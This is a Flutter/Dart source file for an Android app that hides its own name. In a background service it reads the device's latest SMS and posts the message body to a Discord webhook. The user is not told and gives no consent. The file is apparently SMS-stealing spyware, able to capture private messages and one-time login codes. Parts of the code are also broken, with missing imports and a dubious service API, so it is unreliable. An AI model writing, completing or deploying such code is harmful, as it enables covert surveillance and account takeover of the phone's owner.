import 'package:flutter/material.dart';
import 'package:telephony/telephony.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:flutter_background_service/flutter_background_service.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      // Remove the app name by setting the title to an empty string
      title: '',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: SMSReaderApp(),
    );
  }
}

class SMSReaderApp extends StatefulWidget {
  @override
  _SMSReaderAppState createState() => _SMSReaderAppState();
}

class _SMSReaderAppState extends State<SMSReaderApp> {
  final Telephony telephony = Telephony.instance;
  String lastReceivedMessage = "";

  @override
  void initState() {
    super.initState();
    WidgetsFlutterBinding.ensureInitialized();
    _initializeBackgroundService();
  }

  Future<void> _initializeBackgroundService() async {
    final serviceIntent = IsolateService.register();
    serviceIntent.startWork();
    // You might want to perform additional service configurations if required
    serviceIntent.sendPort!.send(null);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(''), // Remove the app name from the app bar
      ),
      body: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Text(
            'Last Received Message: $lastReceivedMessage',
            style: TextStyle(fontSize: 18),
          ),
        ],
      ),
    );
  }
}

class IsolateService {
  static Future<void> callback() async {
    final Telephony telephony = Telephony.instance;
    final SmsMessage? lastMessage = (await telephony.getInboxSms()).last;
    if (lastMessage != null) {
      final discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
      final response = await http.post(
        Uri.parse(discordWebhookURL),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'content': lastMessage.body}),
      );
      if (response.statusCode == 200) {
        print('Message sent to Discord: ${lastMessage.body}');
      } else {
        print('Failed to send message to Discord. Status code: ${response.statusCode}');
      }
    }
  }

  static void _isolateEntry(SendPort sendPort) {
    ReceivePort receivePort = ReceivePort();
    sendPort.send(receivePort.sendPort);
    receivePort.listen((_) {
      callback();
    });
  }

  static IsolateService register() {
    final service = IsolateService._internal();
    FlutterBackgroundService.initialize(callback: _isolateEntry);
    return service;
  }

  IsolateService._internal();

  void startWork() {
    final port = ReceivePort();
    IsolateNameServer.registerPortWithName(port.sendPort, 'background_service');
    port.listen((dynamic data) async {
      final SendPort? uiSendPort = IsolateNameServer.lookupPortByName('main');
      uiSendPort!.send(data);
    });
  }
}
